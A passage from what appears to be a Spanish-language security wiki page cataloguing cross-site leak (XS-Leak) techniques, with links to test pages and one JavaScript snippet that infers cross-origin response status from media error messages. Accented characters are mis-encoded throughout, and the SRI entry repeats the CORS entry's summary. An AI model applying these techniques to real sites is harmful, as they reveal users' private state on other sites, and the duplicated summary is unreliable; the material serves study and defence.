Esta API se puede utilizar para medir el tiempo de una solicitud o para detectar el uso de X-Frame-Options, ya que la p√°gina bloqueada no se agregar√° al objeto `performance` en Chrome.

### Fuga de Errores

* **M√©todos de Inclusi√≥n**: Marcos, Elementos HTML
* **Diferencia Detectable**: C√≥digo de Estado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen**: Una solicitud que produce errores no crear√° una entrada de tiempo de recurso.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Es posible **diferenciar entre los c√≥digos de estado de respuesta HTTP** porque las solicitudes que conducen a un **error** no crean una entrada de rendimiento.

### Error de Recarga de Estilo

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: C√≥digo de Estado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen**: Debido a un error del navegador, las solicitudes que producen errores se cargan dos veces.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

En la t√©cnica anterior tambi√©n se identificaron dos casos en los que los errores en el recolector de basura del navegador llevan a que los recursos se carguen dos veces cuando no se pueden cargar. Esto resultar√° en m√∫ltiples entradas en la API de Rendimiento y, por lo tanto, se pueden detectar.
### Error de Fusi√≥n de Solicitudes

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: C√≥digo de Estado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen:** Las solicitudes que resultan en un error no se pueden fusionar.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

La t√©cnica se encontr√≥ en una tabla en el documento mencionado, pero no se encontr√≥ una descripci√≥n de la t√©cnica en √©l. Sin embargo, puedes encontrar el c√≥digo fuente que lo verifica en [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Fuga de P√°gina Vac√≠a

* **M√©todos de Inclusi√≥n**: Marcos
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen:** Las respuestas vac√≠as no crean entradas de temporizaci√≥n de recursos.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Un atacante puede detectar si una solicitud result√≥ en un cuerpo de respuesta HTTP vac√≠o porque las **p√°ginas vac√≠as no crean una entrada de rendimiento en algunos navegadores**.

### **Fuga de XSS-Auditor**

* **M√©todos de Inclusi√≥n**: Marcos
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen:** Detecta la presencia de elementos espec√≠ficos en una p√°gina web con el XSS-Auditor en SA.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

En SA, es posible detectar si se activ√≥ el XSSAuditor y, por lo tanto, filtrar informaci√≥n confidencial. El XSS-Auditor es una funci√≥n incorporada de SA y GC (ahora eliminada) dise√±ada para mitigar los ataques de Cross-Site Scripting (XSS). En 2013, Braun y Heiderich \[7] demostraron que el XSS-Auditor se puede utilizar para bloquear scripts benignos con falsos positivos. Bas√°ndose en su t√©cnica, los investigadores filtran informaci√≥n y detectan contenido espec√≠fico en una p√°gina de origen cruzado. Estas XS-Leaks se describieron por primera vez en un informe de errores de Terada y luego en una publicaci√≥n de blog de Heyes. Sin embargo, las t√©cnicas descubiertas solo se aplican al XSS-Auditor en GC y no funcionan en SA. Descubrimos que las p√°ginas bloqueadas no crear√°n entradas de Performance API. Esto significa que un atacante a√∫n puede filtrar informaci√≥n confidencial con el XSS-Auditor en SA.

### Fuga de X-Frame

* **M√©todos de Inclusi√≥n**: Marcos
* **Diferencia Detectable**: Encabezado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Resumen:** Un recurso con el encabezado X-Frame-Options no crea una entrada de temporizaci√≥n de recursos.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Si una p√°gina **no est√° permitida** para ser **renderizada** en un **iframe**, no crea una entrada de rendimiento. Como resultado, un atacante puede detectar el encabezado de respuesta **`X-Frame-Options`**.\
Lo mismo ocurre si se utiliza una etiqueta **embed**.

### Detecci√≥n de Descargas

* **M√©todos de Inclusi√≥n**: Marcos
* **Diferencia Detectable**: Encabezado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen:** Las descargas no crean entradas de temporizaci√≥n de recursos en la Performance API.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Similar a la XS-Leak descrita, un **recurso que se descarga** debido al encabezado ContentDisposition, tampoco crea una entrada de rendimiento. Esta t√©cnica funciona en todos los principales navegadores.

### Fuga de Inicio de Redireccionamiento

* **M√©todos de Inclusi√≥n**: Marcos
* **Diferencia Detectable**: Redireccionamiento
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen:** La entrada de temporizaci√≥n de recursos filtra el tiempo de inicio de un redireccionamiento.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Encontramos una instancia de XS-Leak que abusa del comportamiento de algunos navegadores que registran demasiada informaci√≥n para solicitudes de origen cruzado. El est√°ndar define un subconjunto de atributos que deben establecerse en cero para recursos de origen cruzado. Sin embargo, en **SA** es posible detectar si el usuario es **redirigido** por la p√°gina de destino, consultando la **Performance API** y verificando los datos de temporizaci√≥n de **redirectStart**.

### Fuga de Redireccionamiento de Duraci√≥n

* **M√©todos de Inclusi√≥n**: Fetch API
* **Diferencia Detectable**: Redireccionamiento
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen:** La duraci√≥n de las entradas de temporizaci√≥n es negativa cuando ocurre un redireccionamiento.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

En GC, la **duraci√≥n** de las solicitudes que resultan en un **redireccionamiento** es **negativa** y, por lo tanto, se puede **distinguir** de las solicitudes que no resultan en un redireccionamiento.
### Fuga de informaci√≥n de CORP

* **M√©todos de inclusi√≥n**: Marcos
* **Diferencia detectable**: Encabezado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen**: Los recursos protegidos con CORP no crean entradas de tiempo de recurso.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

En algunos casos, la **entrada nextHopProtocol** se puede utilizar como t√©cnica de fuga. En GC, cuando se establece el **encabezado CORP**, el nextHopProtocol estar√° **vac√≠o**. Tenga en cuenta que SA no crear√° ninguna entrada de rendimiento para los recursos habilitados para CORP.

### Trabajador de servicio

* **M√©todos de inclusi√≥n**: Marcos
* **Diferencia detectable**: Uso de API
* **M√°s informaci√≥n**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Resumen**: Detectar si un trabajador de servicio est√° registrado para un origen espec√≠fico.
* **Ejemplo de c√≥digo**:

Los trabajadores de servicio son contextos de script impulsados por eventos que se ejecutan en un origen. Se ejecutan en segundo plano de una p√°gina web y pueden interceptar, modificar y **almacenar en cach√© recursos** para crear aplicaciones web sin conexi√≥n.\
Si un **recurso almacenado en cach√©** por un **trabajador de servicio** se accede a trav√©s de un **iframe**, el recurso se cargar√° desde la cach√© del trabajador de servicio.\
Para detectar si el recurso se carg√≥ desde la cach√© del trabajador de servicio, se puede utilizar la **API de rendimiento**.\
Esto tambi√©n se puede hacer con un ataque de temporizaci√≥n (consulte el documento para obtener m√°s informaci√≥n).

### Cach√©

* **M√©todos de inclusi√≥n**: API Fetch
* **Diferencia detectable**: Temporizaci√≥n
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Resumen**: Detectar si un recurso se almacen√≥ en la cach√©.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Usando la [API de rendimiento](xs-search.md#performance-api), es posible verificar si un recurso est√° en cach√©.\
Para obtener m√°s informaci√≥n: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)

### Duraci√≥n de la red

* **M√©todos de inclusi√≥n**: API Fetch
* **Diferencia detectable**: Contenido de la p√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Resumen**: Es posible recuperar la duraci√≥n de la red de una solicitud desde la API de `performance`.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## T√©cnica de mensajes de error

### Error de medios

* **M√©todos de inclusi√≥n**: Elementos HTML (Video, Audio)
* **Diferencia detectable**: C√≥digo de estado
* **M√°s informaci√≥n**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Resumen**: En FF, es posible filtrar de manera precisa el c√≥digo de estado de una solicitud de origen cruzado.
* **Ejemplo de c√≥digo**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
La propiedad de mensaje de la interfaz **`MediaError`** contiene una **cadena diferente para los recursos que se cargan correctamente**. Esto permite a un atacante inferir el estado de respuesta de un recurso de origen cruzado.

### Error de CORS

* **M√©todos de inclusi√≥n**: Fetch API
* **Diferencia detectable**: Encabezado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumen**: En SA, los mensajes de error de CORS revelan la URL completa de las redirecciones.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Esta t√©cnica permite a un atacante filtrar el destino de una redirecci√≥n iniciada por un sitio de origen cruzado.

CORS permite que los recursos web de acceso p√∫blico se lean y utilicen desde cualquier sitio web. En los navegadores basados en Webkit, es posible **acceder a los mensajes de error de CORS cuando falla una solicitud CORS**. Un atacante puede enviar una solicitud habilitada para CORS a un sitio web objetivo que **redirige** seg√∫n el estado del usuario. Cuando el navegador deniega la solicitud, la **URL completa del destino de la redirecci√≥n se filtra** en el mensaje de error. Con este ataque, es posible detectar redirecciones, filtrar ubicaciones de redirecci√≥n y par√°metros de consulta sensibles.

### Error de SRI

* **M√©todos de inclusi√≥n**: Fetch API
* **Diferencia detectable**: Encabezado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumen**: En SA, los mensajes de error de CORS revelan la URL completa de las redirecciones.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Un atacante puede filtrar el tama√±o de las respuestas de origen cruzado debido a **mensajes de error detallados**.

El atributo de integridad define un hash criptogr√°fico mediante el cual el navegador puede verificar que un recurso obtenido no ha sido manipulado. Este mecanismo de seguridad se llama Integridad de Subrecursos (SRI, por sus siglas en ingl√©s). Se utiliza para la verificaci√≥n de integridad de recursos servidos desde redes de entrega de contenido (CDN). Para evitar fugas de datos, los recursos de origen cruzado deben estar **habilitados para CORS**. De lo contrario, la respuesta no es elegible para la validaci√≥n de integridad. Similar al error de CORS XS-Leak, es posible capturar el **mensaje de error despu√©s de una solicitud fetch con un atributo de integridad que falla**. Un atacante puede provocar **intencionalmente** este **error** en cualquier solicitud especificando un **valor de hash falso**. En SA, este mensaje de error revela la longitud del contenido del recurso solicitado. Un atacante puede utilizar esta filtraci√≥n para detectar diferencias en el tama√±o de la respuesta, lo que permite poderosos ataques XS-Leak.

### Violaci√≥n/Detecci√≥n de CSP

* **M√©todos de inclusi√≥n**: Pop-ups
* **Diferencia detectable**: C√≥digo de estado
* **M√°s informaci√≥n**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Resumen**: Si solo se permite el sitio web de la v√≠ctima en el CSP y se intenta redirigir a un dominio diferente, el CSP generar√° un error detectable.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Un XS-Leak puede utilizar el CSP para detectar si un sitio de origen cruzado fue redirigido a un origen diferente. Esta filtraci√≥n puede detectar la redirecci√≥n, pero adem√°s, se filtra el dominio del destino de la redirecci√≥n. La idea b√°sica de este ataque es **permitir el dominio objetivo en el sitio del atacante**. Una vez que se emite una solicitud al dominio objetivo, este se **redirige** a un dominio de origen cruzado. El CSP **bloquea** el acceso a √©l y crea un **informe de violaci√≥n utilizado como t√©cnica de filtraci√≥n**. Dependiendo del navegador, **este informe puede filtrar la ubicaci√≥n objetivo de la redirecci√≥n**.\
Los navegadores modernos no indicar√°n la URL a la que se redirigi√≥, pero a√∫n se puede detectar que se activ√≥ una redirecci√≥n de origen cruzado.

### Cach√©

* **M√©todos de inclusi√≥n**: Frames, Pop-ups
* **Diferencia detectable**: Contenido de la p√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Resumen**: Borra el archivo de la cach√©. Abre la p√°gina objetivo y verifica si el archivo est√° presente en la cach√©.
* **Ejemplo de c√≥digo:**

Los navegadores pueden utilizar una cach√© compartida para todos los sitios web. Independientemente de su origen, es posible deducir si una p√°gina objetivo ha **solicitado un archivo espec√≠fico**.

Si una p√°gina carga una imagen solo si el usuario ha iniciado sesi√≥n, puedes **invalidar** el **recurso** (para que ya no est√© en cach√© si lo estaba, consulta los enlaces de informaci√≥n adicional), **realizar una solicitud** que podr√≠a cargar ese recurso e intentar cargar el recurso **con una solicitud incorrecta** (por ejemplo, utilizando un encabezado de referer demasiado largo). Si la carga del recurso **no desencadena ning√∫n error**, es porque est√° **en cach√©**.

### Directiva CSP

* **M√©todos de inclusi√≥n**: Frames
* **Diferencia detectable**: Encabezado
* **M√°s informaci√≥n**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Resumen**: Las directivas de encabezado CSP se pueden sondear con el atributo iframe CSP.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Una nueva funci√≥n en GC permite que las p√°ginas web propongan una CSP estableciendo un atributo en un elemento iframe. Las directivas de pol√≠tica se transmiten junto con la solicitud HTTP. Normalmente, el contenido incrustado debe permitir esto expl√≠citamente con un encabezado HTTP, **de lo contrario se muestra una p√°gina de error**. Sin embargo, si el iframe ya env√≠a una CSP y la nueva pol√≠tica no es m√°s estricta, la p√°gina se mostrar√° normalmente.

Esto permite a un atacante detectar directivas CSP espec√≠ficas de una p√°gina de origen cruzado, si es posible **detectar la p√°gina de error**. Aunque este error ahora est√° marcado como solucionado, encontramos una **nueva t√©cnica de filtraci√≥n que puede detectar la p√°gina de error, porque el problema subyacente nunca se solucion√≥**.
### **CORP**

* **M√©todos de inclusi√≥n**: Fetch API
* **Diferencia detectable**: Encabezado
* **M√°s informaci√≥n**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Resumen**: Un recurso protegido con CORP arroja un error al ser obtenido.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

El encabezado CORP es una caracter√≠stica de seguridad relativamente nueva en la plataforma web que, cuando se establece, **bloquea las solicitudes de origen cruzado sin cors al recurso especificado**. La presencia del encabezado puede ser detectada, ya que un recurso protegido con CORP **arrojar√° un error al ser obtenido**.

### CORB

* **M√©todos de inclusi√≥n**: Elementos HTML
* **Diferencia detectable**: Encabezados
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Resumen**: CORB puede permitir a los atacantes detectar si el encabezado `nosniff` est√° presente en la solicitud.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Consulte el enlace de m√°s informaci√≥n para obtener m√°s detalles sobre el ataque.

### Error CORS en la mala configuraci√≥n de reflexi√≥n de origen <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **M√©todos de inclusi√≥n**: Fetch API
* **Diferencia detectable**: Encabezados
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Resumen**: Si el encabezado de origen se refleja en el encabezado `Access-Control-Allow-Origin`, es posible verificar si un recurso ya est√° en la cach√©.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

En caso de que el encabezado de origen se est√© **reflejando** en el encabezado `Access-Control-Allow-Origin`, un atacante puede aprovechar este comportamiento para intentar **obtener** el **recurso** en modo **CORS**. Si no se produce un **error**, significa que se **obtuvo correctamente desde la web**; si se produce un **error**, significa que se **accedi√≥ desde la cach√©** (el error aparece porque la cach√© guarda una respuesta con un encabezado CORS que permite el dominio original y no el dominio del atacante).\
Tenga en cuenta que si el origen no se refleja pero se utiliza un comod√≠n (`Access-Control-Allow-Origin: *`), esto no funcionar√°.

## T√©cnica de atributos legibles

### Redirecci√≥n Fetch

* **M√©todos de inclusi√≥n**: Fetch API
* **Diferencia detectable**: C√≥digo de estado
* **M√°s informaci√≥n**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Resumen**: GC y SA permiten verificar el tipo de respuesta (`opaque-redirect`) despu√©s de que se haya completado la redirecci√≥n.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Al enviar una solicitud utilizando la Fetch API con `redirect: "manual"` y otros par√°metros, es posible leer el atributo `response.type` y si es igual a `opaqueredirect`, entonces la respuesta fue una redirecci√≥n.

### COOP

* **M√©todos de inclusi√≥n**: Ventanas emergentes
* **Diferencia detectable**: Encabezado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Resumen**: Las p√°ginas protegidas con COOP no pueden ser accedidas.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Un atacante puede filtrar si el encabezado de Pol√≠tica de Apertura de Origen Cruzado (COOP) est√° disponible en una respuesta HTTP de origen cruzado.

Las aplicaciones web pueden implementar el encabezado de respuesta COOP para evitar que otros sitios web obtengan referencias de ventana arbitrarias de la aplicaci√≥n. Sin embargo, este **encabezado puede ser detectado f√°cilmente** al intentar leer la referencia **`contentWindow`**. Si un sitio solo implementa COOP en un estado, esta propiedad (`opener`) es **indefinida**; de lo contrario, est√° **definida**.

### Longitud m√°xima de URL - Lado del servidor

* **M√©todos de inclusi√≥n**: Fetch API, Elementos HTML
* **Diferencia detectable**: C√≥digo de estado / Contenido
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Resumen**: Detectar diferencias en las respuestas debido a que la longitud de la respuesta de redirecci√≥n puede ser demasiado grande y el servidor responde con un error, generando una alerta.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Si una redirecci√≥n del lado del servidor utiliza **datos del usuario dentro de la redirecci√≥n** y **datos adicionales**, es posible detectar este comportamiento porque generalmente los **servidores** tienen un **l√≠mite de longitud de solicitud**. Si los **datos del usuario** tienen esa **longitud - 1**, debido a que la **redirecci√≥n** est√° utilizando **esos datos** y **agregando** algo **adicional**, se producir√° un **error detectable a trav√©s de eventos de error**.

Si de alguna manera puede establecer cookies para un usuario, tambi√©n puede realizar este ataque mediante **la configuraci√≥n de suficientes cookies** ([**cookie bomba**](hacking-with-cookies/cookie-bomb.md)) para que, con el **aumento del tama√±o de la respuesta correcta**, se produzca un **error**. En este caso, recuerde que si desencadena esta solicitud desde el mismo sitio, `<script>` enviar√° autom√°ticamente las cookies (para que pueda verificar los errores).\
Un ejemplo de **cookie bomba + XS-Search** se puede encontrar en la soluci√≥n prevista de este informe: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` o estar en el mismo contexto generalmente se necesita para este tipo de ataque.
### Longitud m√°xima de URL - Lado del cliente

* **M√©todos de inclusi√≥n**: Pop-ups
* **Diferencia detectable**: C√≥digo de estado / Contenido
* **M√°s informaci√≥n**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Resumen**: Detecta diferencias en las respuestas debido a que la longitud de la respuesta de redirecci√≥n puede ser demasiado grande para una solicitud, lo que permite notar una diferencia.
* **Ejemplo de c√≥digo**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Seg√∫n la [documentaci√≥n de Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), la longitud m√°xima de URL de Chrome es de 2MB.

> En general, la _plataforma web_ no tiene l√≠mites en la longitud de las URL (aunque 2^31 es un l√≠mite com√∫n). _Chrome_ limita las URL a una longitud m√°xima de **2MB** por razones pr√°cticas y para evitar problemas de denegaci√≥n de servicio en la comunicaci√≥n entre procesos.

Por lo tanto, si la **URL de redirecci√≥n respondida es m√°s grande en uno de los casos**, es posible hacer que redirija con una **URL mayor a 2MB** para alcanzar el **l√≠mite de longitud**. Cuando esto sucede, Chrome muestra una p√°gina **`about:blank#blocked`**.

La **diferencia notable** es que si la **redirecci√≥n** se **complet√≥**, `window.origin` arroja un **error** porque un origen cruzado no puede acceder a esa informaci√≥n. Sin embargo, si se alcanz√≥ el **l√≠mite** y la p√°gina cargada fue **`about:blank#blocked`**, el **`origin`** de la ventana sigue siendo el del **padre**, lo cual es una **informaci√≥n accesible**.

Toda la informaci√≥n adicional necesaria para alcanzar los **2MB** se puede agregar a trav√©s de un **hash** en la URL inicial para que se **use en la redirecci√≥n**.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### M√°ximo de redirecciones

* **M√©todos de inclusi√≥n**: Fetch API, Frames
* **Diferencia detectable**: C√≥digo de estado
* **M√°s informaci√≥n**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Resumen**: Abusa del l√≠mite de redirecciones para detectar redirecciones.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Si el n√∫mero **m√°ximo** de **redirecciones** que puede seguir un navegador es de **20**, un atacante podr√≠a intentar cargar su p√°gina con **19 redirecciones** y finalmente **enviar a la v√≠ctima** a la p√°gina probada. Si se desencadena un **error**, significa que la p√°gina intentaba **redirigir a la v√≠ctima**.

### Longitud del historial

* **M√©todos de inclusi√≥n**: Frames, Pop-ups
* **Diferencia detectable**: Redirecciones
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Resumen**: El c√≥digo JavaScript manipula el historial del navegador y se puede acceder mediante la propiedad de longitud.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

La API de historial permite que el c√≥digo JavaScript manipule el historial del navegador, que **guarda las p√°ginas visitadas por un usuario**. Un atacante puede usar la propiedad de longitud como m√©todo de inclusi√≥n: para detectar navegaciones de JavaScript y HTML.\
Al **verificar `history.length`**, haciendo que un usuario **navegue** a una p√°gina, **cambi√°ndola** de nuevo a la misma origen y **verificando** el nuevo valor de **`history.length`**.

### Longitud del historial con la misma URL

* **M√©todos de inclusi√≥n**: Frames, Pop-ups
* **Diferencia detectable**: Si la URL es la misma que la adivinada
* **Resumen**: Es posible adivinar si la ubicaci√≥n de un frame/pop-up est√° en una URL espec√≠fica abusando de la longitud del historial.
* **Ejemplo de c√≥digo**: A continuaci√≥n

